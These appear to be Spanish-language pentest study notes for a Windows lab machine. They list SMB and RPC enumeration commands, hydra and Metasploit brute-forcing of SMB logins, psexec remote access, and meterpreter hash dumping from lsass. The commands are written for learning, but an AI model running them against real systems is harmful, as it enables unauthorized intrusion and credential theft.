## Maquina 2

Tags: #Windows #SMB #RPC 

- IP -> VMware
- Ports -> TCP (21,80,135,139,445,5985,47001,49152...8), UDP (idk)
- OS ->  Windows 
- Services & Applications
    - 21 -> tcpwrapped
    - 80 -> IIS/8.5
    - 445 -> 

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash 
❯ nmap -sCV -p- <IP>            # Escaneamos todos los puertos y con las otras banderas obtendremos mas informacion 
```

### Puerto 21

```bash
❯ nmap -A -p21 ❮Target IP❯                             # Ver mas informacion del puerto 21 

	# A = Agressive
	# sV = Version

❯ nmap --script ftp-anon -p21 ❮Target IP❯              # ftp-enum = Escanea y mira si el usuario invitado 'Anonymous' esta habilitado

	#  p21 = Indica el puerto que se quiere escanear
	#  Target IP = Dirección IP que se quiere escanear
```

```bash 
❯ ftp ❮Target IP❯                 # Para ingresar al servicio FTP
```
Para este puerto no encontramos nada

### Puerto 80

```bash 
❯ dirb http://Target_IP/          # Usaremos la tool dirb para enumeracion de directorios 

	# /usr/share/dirb/wordlists/common.txt
```

## Puerto 445

```bash
❯ nmap -p445 -sCV ❮Target IP❯                                # Para enumerar exaustiva al SMB 

❯ nmap -p445 --script smb-protocols ❮Target IP❯              # Ver que protocolos se estan usando

❯ nmap -p445 --script smb-security-mode ❮Target IP❯          # Ver si permite la autenticacion de usuarios sin passwd

❯ nmap -p445 --script smb-enum-shares ❮Target IP❯            # Ver si hay directorios 

❯ nmap -p445 --script smb-enum-users ❮Target IP❯             # Ver si hay usuarios 

❯ nmap -p445 --script smb-enum-sessions ❮Target IP❯          # Ver si hay sesiones activas

❯ nmap --script "vuln and safe" -p445 ❮Target IP❯ -oN smbVulnScan   # Para ver si este servicio es vulnerable al ethernalblue (ms17-010) en Windows 7.

	#  p445 = Indica el puerto que se quiere escanear
	#  Target IP = Dirección IP que se quiere escanear
	#  oN smbVulnScan = Exporta el output a un fichero en formato nmap con nombre “smbVulnScan”
	#  vuln and safe = Detecta vulnerabilidades de forma segura, sin experimentar un DoS
```

```bash 
❯ smbclient -L ❮IP❯ -N                # Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)

❯ smbclient //IP/C                    # Conectarse al directorio C:
```

```bash 
❯ rpcclient -U "" <IP>               # Otra forma de ingresar, te ayuda a enumerar el SMB

	# U = Usuario de forma anonima
	# IP = Direccion de la maquina victima
	
	❯ help
	❯ srvinfo           # Nos muestra informacion del sistema
	❯ querydominfo      # Nos muestra mas informacion del sistema
	❯ enumdomgroups     # Enumeracion de grupos
	❯ enumdomusers      # Enumeracion de usuarios
	❯ netshareenumall
```

```bash 
❯ enum4linux <IP> -a     # Herramienta que nos ayuda a enumerar 
❯ enum4linux -U '' <IP> -a 
```

```bash 
❯ smbmap -H ❮IP❯                      # Herramienta elternativa para ver si nos reporta algo mas y nos reporta los permisos (WRITE, READ)
❯ smbmap -H ❮IP❯ -u 'null'            # Herramienta elternativa para ver si nos reporta algo mas haciendo uso de un null sesion (sin credencial alguna)
❯ smbmap -H ❮IP❯ -u "" -p ""
```

```bash 
❯ hydra -L user.list -P password.list smb://<IP>        # Para ver si esos usuarios y passwd son validos en un servidor SMB

	# L = Ruta o archivo que contiene los usuarios
	# P = Ruta o archivo que contiene las passwd
```


Si salen errores, podemos usar Metasploit
```bash 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search smb_login          # Buscamos el exploit
	❯ use 0                     # Usamos el exploit 'auxiliary/scanner/smb/smb_login'
	❯ options
	❯ set RHOSTS 192.168.1.194  # Colocamos la IP de la maquina victima
	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix-users.txt 
	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
	❯ set VERBOSE false
	❯ run 


❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search smb_login          # Buscamos el exploit
	❯ use 0                     # Usamos el exploit 'auxiliary/scanner/smb/smb_login'
	❯ options
	❯ set RHOSTS 192.168.1.194  # Colocamos la IP de la maquina victima
	❯ set VERBOSE false
	❯ set SMBUSER administrator
	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
	❯ run
```


Log a SMB con psexec por el puerto  135
```python
❯ locate psexec            # Buscamos la tool en nuestra maquina de atacante '/usr/share/doc/python3-impacket/examples/psexec.py'
❯ psexec.py administrator@IP # Para ingresar al SMB con un usuario y una passwd
```

Otra forma de ingresar es:
```bash 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search psexec type:exploit            # Buscamos el exploit
	❯ use 1                                 # Usamos el exploit 'exploit/windows/smb/psexec'
	❯ options
	❯ set RHOSTS 192.168.1.194              # Colocamos la IP de la maquina victima
	❯ set SMBUSER administrator             # Colocamos al usuario Administrator
	❯ set SMBPASS <passwd>                  # Colocamos la passwd de l usuario
	❯ run

	❯ sysinfo
	❯ getuid
	❯ help
	❯ hashdump
	❯ pgrep lsass                           # Buscamos el proceso
	❯ migrate 464                           # migramos a ese proceso 
	❯ hashdump                              # Dumpeamos los passwd 'hashes'
	❯ ps                                    # Miramos todos los procesos
```

## User


## Root